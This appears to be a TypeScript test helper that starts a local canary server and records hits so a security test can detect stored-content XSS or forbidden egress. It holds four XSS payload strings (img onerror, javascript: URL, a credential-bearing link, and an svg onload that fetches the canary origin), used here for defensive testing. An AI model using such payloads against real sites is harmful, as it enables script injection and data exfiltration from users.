import { existsSync, mkdirSync, readFileSync, renameSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { z } from 'zod';

import { startCanary } from './canary.ts';

const recordPath = fileURLToPath(new URL('../.auth/security-stored-content.json', import.meta.url));
const maxRecordBytes = 16 * 1024;
const zStoredContent = z.object({
  origin: z.string().url(), payloads: z.array(z.string()).length(4),
  hits: z.number().int().nonnegative(),
});

/** Read only complete, bounded observations published by the owned listener. */
export function readStoredContent(path = recordPath): z.infer<typeof zStoredContent> {
  if (statSync(path).size > maxRecordBytes) throw new Error('stored-content canary record exceeds its bound');
  return zStoredContent.parse(JSON.parse(readFileSync(path, 'utf8')));
}

/** Keep the real canary alive while its prepared payloads cross into the worker. */
export async function startStoredContent(path = recordPath): Promise<{
  payloads: string[]; close: () => Promise<void>;
}> {
  if (existsSync(path) || existsSync(`${path}.tmp`)) {
    throw new Error('refusing an existing stored-content canary record');
  }
  mkdirSync(dirname(path), { recursive: true });
  const canary = await startCanary();
  const payloads = [
    `<img src="${canary.origin}/stolen-image" onerror="document.documentElement.dataset.hikyoSecurity=1">`,
    'javascript:document.documentElement.dataset.hikyoSecurity=1',
    `${canary.origin}/stolen-link?credential=tenant-content`,
    `<svg onload="fetch('${canary.origin}/stolen-fetch');document.documentElement.dataset.hikyoSecurity=1">`,
  ];
  let failure: Error | undefined;
  let closing = false;
  const publish = (): void => {
    if (failure !== undefined) return;
    try {
      const state = zStoredContent.parse({ origin: canary.origin, payloads, hits: canary.hits.length });
      const raw = JSON.stringify(state);
      if (Buffer.byteLength(raw) > maxRecordBytes) throw new Error('stored-content canary record exceeds its bound');
      writeFileSync(`${path}.tmp`, raw, { mode: 0o600 });
      renameSync(`${path}.tmp`, path);
    } catch (error) {
      fail(new Error('stored-content canary observation could not be published', { cause: error }));
    }
  };
  const fail = (error: Error): void => {
    failure = error;
    // An unreadable/missing observation refuses the worker instead of leaving
    // an old zero-hit record that could falsely certify forbidden egress.
    try { rmSync(path, { force: true }); }
    catch (cleanupError) { failure = new AggregateError([error, cleanupError], 'canary observation invalidation failed'); }
  };
  const stopped = (): void => {
    if (!closing) fail(new Error('stored-content canary listener stopped before teardown'));
  };
  const close = async (): Promise<void> => {
    closing = true;
    const errors: Error[] = [];
    try { await canary.close(); }
    catch (error) { errors.push(new Error('stored-content canary listener cleanup failed', { cause: error })); }
    if (failure !== undefined) errors.push(failure);
    canary.server.off('request', publish);
    canary.server.off('error', fail);
    canary.server.off('close', stopped);
    for (const owned of [path, `${path}.tmp`]) {
      try { rmSync(owned, { force: true }); }
      catch (error) { errors.push(new Error('stored-content canary record cleanup failed', { cause: error })); }
    }
    if (errors.length > 0) throw new AggregateError(errors, 'stored-content canary failed');
  };
  canary.server.on('request', publish);
  canary.server.on('error', fail);
  canary.server.on('close', stopped);
  publish();
  if (failure !== undefined) await close();
  return { payloads, close };
}
